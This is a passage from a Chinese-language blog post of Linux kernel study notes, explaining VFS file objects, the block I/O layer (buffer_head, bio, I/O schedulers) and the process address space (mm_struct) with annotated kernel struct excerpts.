当目录项对象丢失其索引节点时（也就是磁盘索引节点被删除了）,VFS会调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*d_iput)(struct dentry *, struct inode *);</span><br><span class="line">    <span class="keyword">char</span> *(*d_dname)(struct dentry *, <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>文件</strong></p>
<p>文件对象表示进程已打开的文件，从用户角度来看，我们在代码中操作的就是一个文件对象，它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息，它的作用范围是某一具体进程</p>
<ul>
<li>文件对象反过来指向一个目录项对象（目录项反过来指向一个索引节点）</li>
</ul>
<p>其实只有目录项对象才表示一个已打开的实际文件，虽然一个文件对应的文件对象不是唯一的，但其对应的索引节点和目录项对象却是唯一的</p>
<p>下面是用于描述文件的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 文件对象结构中定义的字段非常多</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些重要的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">fu_list</span>;</span>    <span class="comment">/* 文件对象链表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">fu_rcuhead</span>;</span> <span class="comment">/* 释放之后的RCU链表 */</span></span><br><span class="line">    &#125; f_u;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span>        <span class="title">f_path</span>;</span>             <span class="comment">/* 包含的目录项 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">f_op</span>;</span> <span class="comment">/* 文件操作函数 */</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span>        f_count;        <span class="comment">/* 文件对象引用计数 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其中的 f_op 中定义了文件对象的操作方法</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些相对重要的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 用于更新偏移量指针,由系统调用lleek()调用它 */</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="comment">/* 由系统调用read()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 由系统调用write()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 由系统调用aio_read()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 由系统调用aio_write()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 将给定文件映射到指定的地址空间上,由系统调用mmap调用它 */</span></span><br><span class="line">    <span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">    <span class="comment">/* 创建一个新的文件对象,并将它和相应的索引节点对象关联起来 */</span></span><br><span class="line">    <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">    <span class="comment">/* 当已打开文件的引用计数减少时,VFS调用该函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>四个对象之间关系图：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661438949794-1661853278313.png" class width="1661438949794"> 
<h2 id="块I-O层"><a href="#块I-O层" class="headerlink" title="块I/O层"></a>块I/O层</h2><p>I/O设备主要有2类：</p>
<ul>
<li>字符设备：只能顺序读写设备中的内容（比如：串口设备，键盘）</li>
<li>块设备：能够随机读写设备中的内容（比如：硬盘，U盘）</li>
</ul>
<p>字符设备由于只能顺序访问，因此应用场景也不多，块设备是随机访问的，所以块设备在不同的应用场景中存在很大的优化空间</p>
<ul>
<li>块设备的最小寻址单元就是扇区，扇区的大小是2的整数倍，一般是512字节</li>
<li>扇区是物理上的最小寻址单元，而逻辑上的最小寻址单元是块</li>
<li>为了便于文件系统管理，块的大小一般是扇区的整数倍，并且小于等于页的大小</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面  sudo fdisk -l</span><br><span class="line">[sudo] yhellow 的密码： </span><br><span class="line">Disk /dev/loop0：<span class="number">4</span> KiB，<span class="number">4096</span> 字节，<span class="number">8</span> 个扇区</span><br><span class="line">单元：扇区 / <span class="number">1</span> * <span class="number">512</span> = <span class="number">512</span> 字节</span><br><span class="line">扇区大小(逻辑/物理)：<span class="number">512</span> 字节 / <span class="number">512</span> 字节</span><br><span class="line">I/O 大小(最小/最佳)：<span class="number">512</span> 字节 / <span class="number">512</span> 字节</span><br></pre></td></tr></table></figure>
<p><strong>内核访问块设备</strong></p>
<p>内核通过文件系统访问块设备时，需要先把块读入到内存中，所以文件系统为了管理块设备，必须管理[块]和内存页之间的映射</p>
<p>内核中有2种方法来管理 [<strong>块</strong>] 和内存页之间的映射：</p>
<p>一，缓冲区和缓冲区头：</p>
<ul>
<li>每个 [<strong>块</strong>] 都是一个缓冲区，同时对每个 [<strong>块</strong>] 都定义一个缓冲区头来描述它</li>
<li>由于 [<strong>块</strong>] 的大小是小于内存页的大小的，所以每个内存页会包含一个或者多个 [<strong>块</strong>]</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> b_state;            <span class="comment">/* 表示缓冲区状态 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">b_this_page</span>;</span><span class="comment">/* 当前页中缓冲区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">b_page</span>;</span>            <span class="comment">/* 当前缓冲区所在内存页 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">sector_t</span> b_blocknr;        <span class="comment">/* 起始块号 */</span></span><br><span class="line">    <span class="keyword">size_t</span> b_size;            <span class="comment">/* buffer在内存中的大小 */</span></span><br><span class="line">    <span class="keyword">char</span> *b_data;            <span class="comment">/* 块映射在内存页中的数据 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">b_bdev</span>;</span> <span class="comment">/* 关联的块设备 */</span></span><br><span class="line">    <span class="keyword">bh_end_io_t</span> *b_end_io;        <span class="comment">/* I/O完成方法 */</span></span><br><span class="line">     <span class="keyword">void</span> *b_private;             <span class="comment">/* 保留的 I/O 完成方法 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">b_assoc_buffers</span>;</span>   <span class="comment">/* 关联的其他缓冲区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">b_assoc_map</span>;</span>    <span class="comment">/* 相关的地址空间 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> b_count;                    <span class="comment">/* 引用计数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>二，bio 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * I/O操作的主要单元,针对I/O块和更低级的层(ie drivers and stacking drivers)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> &#123;</span></span><br><span class="line">    <span class="keyword">sector_t</span>        bi_sector;    <span class="comment">/* 磁盘上相关扇区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio</span>        *<span class="title">bi_next</span>;</span>    <span class="comment">/* 请求列表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>    *<span class="title">bi_bdev</span>;</span> <span class="comment">/* 相关的块设备 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        bi_flags;    <span class="comment">/* 状态和命令标志 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        bi_rw;        <span class="comment">/* 读还是写 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>        bi_vcnt;    <span class="comment">/* bio_vecs的数目 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>        bi_idx;        <span class="comment">/* bio_io_vect的当前索引 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结合后的片段数目 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_phys_segments;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_size;    <span class="comment">/* 剩余 I/O 计数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第一个和最后一个可合并的段的大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_seg_front_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_seg_back_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_max_vecs;    <span class="comment">/* bio_vecs数目上限 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_comp_cpu;    <span class="comment">/* 结束CPU */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">atomic_t</span>        bi_cnt;        <span class="comment">/* 使用计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>        *<span class="title">bi_io_vec</span>;</span>    <span class="comment">/* bio_vec 链表 */</span></span><br><span class="line">    <span class="keyword">bio_end_io_t</span>        *bi_end_io; <span class="comment">/* I/O 完成方法 */</span></span><br><span class="line">    <span class="keyword">void</span>            *bi_private;    <span class="comment">/* bio结构体创建者的私有方法 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_BLK_DEV_INTEGRITY)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_integrity_payload</span> *<span class="title">bi_integrity</span>;</span>  <span class="comment">/* data integrity */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">bio_destructor_t</span>    *bi_destructor;    <span class="comment">/* bio撤销方法 */</span></span><br><span class="line">    <span class="comment">/* 内嵌在结构体末尾的bio向量,主要为了防止出现二次申请少量的bio_vecs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>        <span class="title">bi_inline_vecs</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>bio 结构体：表示正在执行的 I/O 操作相关的信息</li>
<li>bi_io_vec 链表：表示当前 I/O 操作涉及到的内存页（每个 bio_vec 都是对应一个页面，从而保证内核能够方便高效的完成 I/O 操作）</li>
<li>bio_vec 结构体：表示 I/O 操作使用的片段</li>
<li>bi_vcnt：表示 bi_io_vec 链表中 bi_vec 的个数</li>
<li>bi_idx：表示当前的 bi_vec 片段，通过 bi_vcnt（总数）和 bi_idx（当前数），就可以跟踪当前 I/O 操作的进度</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661472333928-1661853278314.png" class width="1661472333928"> 
<p><strong>内核I/O调度</strong></p>
<ul>
<li>Linus 电梯：<ul>
<li>为了保证磁盘寻址的效率，一般会尽量让磁头向一个方向移动，等到头了再反过来移动，这样可以缩短所有请求的磁盘寻址总时间</li>
<li>磁头的移动有点类似于电梯，所以这个 I/O 调度算法也叫电梯调度</li>
</ul>
</li>
<li>最终期限I/O调度：<ul>
<li>最终期限I/O调度算法类似于 Linus 电梯，但是给每个请求设置了超时时间，默认情况下，读请求的超时时间500ms，写请求的超时时间是5s</li>
</ul>
</li>
<li>预测I/O调度：<ul>
<li>基于最终期限I/O调度算法，新的读请求提交后，并不立即进行请求处理，而是有意等待片刻(默认是6ms)</li>
<li>等待期间如果有其他对磁盘相邻位置进行读操作的读请求加入，会立刻处理这些读请求</li>
<li>等待期间如果没有其他读请求加入，那么等待时间相当于浪费掉</li>
</ul>
</li>
<li>完全公正的排队I/O调度：<ul>
<li>完全公正的排队（Complete Fair Queuing，CFQ）I/O调度，是为专有工作负荷设计的，它和之前提到的I/O调度有根本的不同</li>
<li>CFQ I/O调度算法中，每个进程都有自己的I/O队列</li>
<li>CFQ I/O调度程序以时间片轮转调度队列，从每个队列中选取一定的请求数（默认4个），然后进行下一轮调度</li>
</ul>
</li>
<li>空操作的I/O调度：<ul>
<li>空操作I/O调度几乎不做什么事情，这也是它这样命名的原因</li>
<li>空操作I/O调度只做一件事情，当有新的请求到来时，把它与任一相邻的请求合并</li>
</ul>
</li>
</ul>
<p>Linux 内核中内置了上面4种I/O调度，可以在启动时通过命令行选项 <code>elevator=xxx</code> 来启用任何一种</p>
<p>elevator 选项参数如下:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>I/O调度程序</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>as</td>
<td>预测</td>
</tr>
<tr>
<td>cfq</td>
<td>完全公正排队</td>
</tr>
<tr>
<td>deadline</td>
<td>最终期限</td>
</tr>
<tr>
<td>noop</td>
<td>空操作</td>
</tr>
</tbody>
</table>
</div>
<h2 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h2><p><strong>地址空间</strong></p>
<p>进程地址空间也就是每个进程所使用的内存（就是每个进程所能访问的虚拟内存地址范围），内核对进程地址空间的管理，也就是对用户态程序的内存管理</p>
<ul>
<li>现代的操作系统中进程都是在保护模式下运行的，地址空间其实是操作系统给进程用的一段连续的虚拟内存空间</li>
<li>地址空间最终会通过页表映射到物理内存上，因为内核操作的是物理内存</li>
</ul>
<p>虽然地址空间的范围很大，但是进程也不一定有权限访问全部的地址空间（一般都是只能访问地址空间中的一些地址区间），进程能够访问的那些地址区间也称为 [内存区域]，进程如果访问了有效内存区域以外的内容就会报 “段错误” 信息</p>
<ul>
<li>[内存区域]：进程能够访问的那些 [地址区间]</li>
</ul>
<p>内存区域中主要包含以下信息：</p>
<ul>
<li>代码段 (text section)，即可执行文件代码的内存映射</li>
<li>数据段 (data section)，即可执行文件的已初始化全局变量的内存映射</li>
<li>bss 段的零页 (页面信息全是“0”值)，即未初始化全局变量的内存映射</li>
<li>进程用户空间栈的零页内存映射</li>
<li>进程使用的C库或者动态链接库等共享库的代码段，数据段和bss段的内存映射</li>
<li>任何内存映射文件</li>
<li>任何共享内存段</li>
<li>任何匿名内存映射，比如由 malloc() 分配的内存</li>
</ul>
<p>linux 中的地址空间是用 mm_struct 来表示的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap</span>;</span>        <span class="comment">/* [内存区域]链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span>               <span class="comment">/* [内存区域]红黑树 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap_cache</span>;</span>    <span class="comment">/* 最近一次访问的[内存区域] */</span></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>;  <span class="comment">/* 获取指定区间内一个还未映射的地址，出错时返回错误码 */</span></span><br><span class="line">    <span class="keyword">void</span> (*unmap_area) (struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr);  <span class="comment">/* 取消地址 addr 的映射 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_base;        <span class="comment">/* 地址空间中可以用来映射的首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> task_size;        <span class="comment">/* 进程的虚拟地址空间大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cached_hole_size;     <span class="comment">/* 如果不空的话，就是 free_area_cache 后最大的空洞 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> free_area_cache;        <span class="comment">/* 地址空间的第一个空洞 */</span></span><br><span class="line">    <span class="keyword">pgd_t</span> * pgd;                        <span class="comment">/* 页全局目录 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> mm_users;            <span class="comment">/* 使用地址空间的用户数 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> mm_count;            <span class="comment">/* 实际使用地址空间的计数， (users count as 1) */</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                <span class="comment">/* [内存区域]个数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">mmap_sem</span>;</span>   <span class="comment">/* 内存区域信号量 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> page_table_lock;        <span class="comment">/* 页表锁 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mmlist</span>;</span>        <span class="comment">/* 所有地址空间形成的链表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Special counters, in some configurations protected by the</span></span><br><span class="line"><span class="comment">     * page_table_lock, in other configurations by being atomic.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">mm_counter_t</span> _file_rss;</span><br><span class="line">    <span class="keyword">mm_counter_t</span> _anon_rss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_rss;    <span class="comment">/* High-watermark of RSS usage */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_vm;    <span class="comment">/* High-water virtual memory usage */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> total_vm, locked_vm, shared_vm, exec_vm;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_code, end_code, start_data, end_data; <span class="comment">/* 代码段，数据段的开始和结束地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_brk, brk, start_stack; <span class="comment">/* 堆的首地址，尾地址，进程栈首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> arg_start, arg_end, env_start, env_end; <span class="comment">/* 命令行参数，环境变量首地址，尾地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="comment">/* for /proc/PID/auxv */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> *<span class="title">binfmt</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">cpumask_t</span> cpu_vm_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Architecture-specific MM context */</span></span><br><span class="line">    <span class="keyword">mm_context_t</span> context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Swap token stuff */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Last value of global fault stamp as seen by this process.</span></span><br><span class="line"><span class="comment">     * In other words, this value gives an indication of how long</span></span><br><span class="line"><span class="comment">     * it has been since this task got the token.</span></span><br><span class="line"><span class="comment">     * Look at mm/thrash.c</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> faultstamp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> token_priority;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> last_interval;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags; <span class="comment">/* Must use atomic bitops to access the bits */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">core_state</span> *<span class="title">core_state</span>;</span> <span class="comment">/* coredumping support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_AIO</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        ioctx_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>    <span class="title">ioctx_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MM_OWNER</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * &quot;owner&quot; points to a task that is regarded as the canonical</span></span><br><span class="line"><span class="comment">     * user/owner of this mm. All of the following must be true in</span></span><br><span class="line"><span class="comment">     * order for it to be changed:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * current == mm-&gt;owner</span></span><br><span class="line"><span class="comment">     * current-&gt;mm != mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;mm == mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;alloc_lock is held</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line">    <span class="comment">/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">exe_file</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> num_exe_file_vmas;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU_NOTIFIER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmu_notifier_mm</span> *<span class="title">mmu_notifier_mm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>mm_users：就是 mm_struct 被用户空间进程(线程)引用的次数 </li>
<li>mm_count：其实它记录就是 mm_struct 实际的引用计数 <ul>
<li>当 mm_users=0 时，并不一定能释放此 mm_struct，只有当 mm_count=0 时，才可以确定释放此 mm_struct</li>
<li>如果只有1个进程使用 mm_struct，那么 mm_users=1，mm_count也是 1</li>
<li>如果有9个线程在使用 mm_struct，那么 mm_users=9，而 mm_count 仍然为 1</li>
</ul>
</li>
</ul>
<p><strong>虚拟内存区域(VMA)</strong></p>
<p>[内存区域]（进程能够访问的那些 [地址区间]）在 linux 中也被称为 [虚拟内存区域]（VMA），它其实就是进程地址空间上一段连续的内存范围</p>
<p>结构体如下：</p>
